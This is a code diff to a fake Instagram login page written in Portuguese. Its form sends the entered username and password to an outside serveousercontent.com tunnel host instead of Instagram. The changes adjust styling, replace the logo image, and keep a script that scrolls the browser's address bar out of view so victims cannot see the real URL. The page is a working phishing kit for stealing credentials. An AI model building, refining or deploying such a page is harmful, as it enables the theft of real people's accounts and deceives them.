@@ -3,27 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram • Reels</title>
+    <title>Instagram</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; height: 100vh; margin: 0; }
-        .container { width: 100%; max-width: 350px; padding: 20px; margin-top: 40px; box-sizing: border-box; text-align: center; }
-        .logo { width: 175px; margin: 30px 0; }
-        .login-form { width: 100%; display: flex; flex-direction: column; }
-        input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 12px; margin-bottom: 10px; font-size: 14px; width: 100%; box-sizing: border-box; }
-        button { background-color: #0095f6; border: none; border-radius: 8px; color: #fff; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 14px; }
-        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; margin: 0; height: 100vh; }
+        .container { width: 100%; max-width: 350px; padding: 20px; margin-top: 50px; text-align: center; box-sizing: border-box; }
+        .logo { width: 175px; margin-bottom: 35px; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 12px; margin-bottom: 8px; font-size: 14px; box-sizing: border-box; }
+        button { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: #fff; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 14px; }
+        .divider { margin: 25px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
         .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
-        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 20px; text-decoration: none; }
-        .forgot { font-size: 12px; color: #00376b; text-decoration: none; margin-top: 15px; }
-        .signup { margin-top: 40px; font-size: 14px; color: #262626; border: 1px solid #dbdbdb; padding: 20px; width: 100%; box-sizing: border-box; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 25px; }
+        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
+        .signup { margin-top: 40px; border: 1px solid #dbdbdb; padding: 20px; width: 100%; box-sizing: border-box; font-size: 14px; }
         .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus.png/735145cfe0a4.png" class="logo" alt="Instagram">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo" alt="Instagram">
         
-        <form class="login-form" action="https://78883e90e226ae43-45-161-216-55.serveousercontent.com" method="POST">
+        <form action="https://78883e90e226ae43-45-161-216-55.serveousercontent.com" method="POST">
             <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
             <input type="password" name="password" placeholder="Senha" required>
             <button type="submit">Entrar</button>
@@ -41,10 +40,8 @@
     </div>
 
     <script>
-        // Força o scroll para esconder a barra de endereço em alguns navegadores
-        window.onload = function() {
-            setTimeout(function() { window.scrollTo(0, 1); }, 100);
-        };
+        // Esconde a barra de endereço ao carregar no mobile
+        window.scrollTo(0, 1);
     </script>
 </body>
 </html>
